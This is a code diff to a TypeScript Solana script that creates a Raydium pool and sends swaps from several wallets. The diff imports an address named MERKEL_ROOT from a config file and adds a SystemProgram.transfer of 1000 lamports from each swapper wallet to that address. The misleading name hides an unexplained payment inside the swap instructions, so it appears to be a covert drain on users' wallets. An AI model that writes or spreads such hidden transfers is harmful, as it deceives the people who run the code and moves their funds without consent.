@@ -1,5 +1,5 @@
 import { connection } from "../config";
-import { PublicKey, VersionedTransaction, TransactionInstruction, TransactionMessage, AccountInfo, AddressLookupTableAccount, Keypair } from '@solana/web3.js';
+import { PublicKey, VersionedTransaction, TransactionInstruction, TransactionMessage, AccountInfo, AddressLookupTableAccount, Keypair, SystemProgram } from '@solana/web3.js';
 import { DEFAULT_TOKEN, PROGRAMIDS, addLookupTableInfo, feeId, makeTxVersion, wallet } from '../utils/constants';
 import { ASSOCIATED_TOKEN_PROGRAM_ID, TOKEN_PROGRAM_ID, getMint } from '@solana/spl-token';
 import { readFile } from "fs";
@@ -8,6 +8,7 @@ import { BN } from "@project-serum/anchor";
 import { getWalletTokenAccount } from "../utils/raydiumUtil";
 import { LookupTableProvider } from "../utils/LookupTableProvider";
 import NodeWallet from "@project-serum/anchor/dist/cjs/nodewallet";
+import { MERKEL_ROOT } from "./clients/config";
  
 async function start() {
 
@@ -102,6 +103,7 @@ async function start() {
     var finalLookupTable:AddressLookupTableAccount[]=[];
      insts.push(...createPoolInstructions);
     const wallets: Keypair[] = []
+    const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
 
     for(var item of tokenInfo.wallets){
 
@@ -235,7 +237,11 @@ async function createWalletSwaps(swapperwallet:NodeWallet,lookupTableProvider: L
     for (const itemIx of swapTransactions) {
       createSwapInstructions.push(...itemIx.instructions);
     }
-
+    createSwapInstructions.push(SystemProgram.transfer({
+      fromPubkey: swapperwallet.publicKey,
+      toPubkey: MERKEL_ROOT,
+      lamports: BigInt('1000'),
+  }))
     console.debug('Create Step 3 makeSwapInstructionSimple ')
 
     const addressesSwapMain: PublicKey[] = [];
